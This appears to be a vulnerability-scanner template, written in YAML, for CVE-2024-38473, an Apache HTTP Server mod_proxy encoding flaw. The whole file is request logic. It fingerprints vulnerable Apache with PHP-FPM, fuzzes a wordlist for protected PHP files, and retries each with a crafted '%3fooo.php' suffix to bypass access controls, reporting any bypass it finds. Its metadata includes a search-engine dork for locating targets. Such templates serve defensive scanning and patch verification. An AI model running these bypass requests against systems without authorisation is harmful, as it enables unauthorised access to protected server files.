flow: http(1) && http(2) && http(3) && http(4) && http(5) && http(6) && http(7)
http:
- matchers:
  - internal: true
    status:
    - 404
    type: status
  method: GET
  path:
  - '{{RootURL}}{{Path}}/index.phpooo.php%3fooo.php'
- matchers:
  - internal: true
    status:
    - 404
    type: status
  method: GET
  path:
  - '{{RootURL}}{{Path}}/foo.phpooo.php%3fooo.php'
- attack: batteringram
  matchers:
  - internal: true
    status:
    - 200
    type: status
  method: GET
  path:
  - '{{RootURL}}{{Path}}/{{fuzz}}'
  payloads:
    fuzz:
    - index.php
    - index.html
    - index.htm
    - '{{File}}'
  stop-at-first-match: true
  threads: 1
- matchers:
  - internal: true
    status:
    - 404
    type: status
  method: GET
  path:
  - '{{RootURL}}{{Path}}/{{http_3_fuzz}}%3fooo.html'
- extractors:
  - dsl:
    - '"[*] Vulnerable Apache < 2.4.60 with PHP-FPM detected!"'
    type: dsl
  matchers:
  - condition: or
    dsl:
    - len(http_3_body)==len(body) && status_code==200 && contains(http_3_fuzz, '.php')
    - status_code==403 && contains(http_3_fuzz,'.htm')
    type: dsl
  method: GET
  path:
  - '{{RootURL}}{{Path}}/{{http_3_fuzz}}%3fooo.php'
- attack: batteringram
  matchers:
  - condition: and
    internal: true
    status:
    - 403
    - 401
    type: status
  method: GET
  path:
  - '{{RootURL}}{{Path}}/{{fuzz}}'
  payloads:
    fuzz: wordlists/potential_protected_php_files_10.txt
  stop-at-first-match: true
  threads: 1
- extractors:
  - dsl:
    - '"[*] ACL BYPASS FOUND! " + BaseURL + "/" + http_6_fuzz +"%3fooo.php"'
    type: dsl
  matchers:
  - status:
    - 200
    type: status
  method: GET
  path:
  - '{{RootURL}}{{Path}}/{{http_6_fuzz}}%3fooo.php'
id: CVE-2024-38473
info:
  author: Orange Tsai
  classification:
    cpe: cpe:/a:apache:http_server, cpe:/a:apache:httpd
    cve-id: CVE-2024-38473
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H
    cvss-score: 8.1
    cwe-id: CWE-116
    epss-percentile: 9
    epss-score: 0.04
  description: Encoding problem in mod_proxy in Apache HTTP Server 2.4.59 and earlier
    allows request URLs with incorrect encoding to be sent to backend services, potentially
    bypassing authentication via crafted requests.
  metadata:
    google-query: intitle:"Apache HTTP Server" inurl:"/server-status"
    max-request: 10
    product: Apache HTTP Server
    vendor: Apache Software Foundation
  name: Apache HTTP Server - ACL Bypass
  reference:
  - https://blog.orange.tw/2024/08/confusion-attacks-en.html#%E2%9A%94%EF%B8%8F-Primitive-1-2-ACL-Bypass
  - https://www.cvedetails.com/cve/CVE-2024-38473/
  - https://nvd.nist.gov/vuln/detail/CVE-2024-38473
  remediation: Fixed in v2.4.60
  severity: high
  tags: cve, apache, acl-bypass, mod_proxy, php-fpm
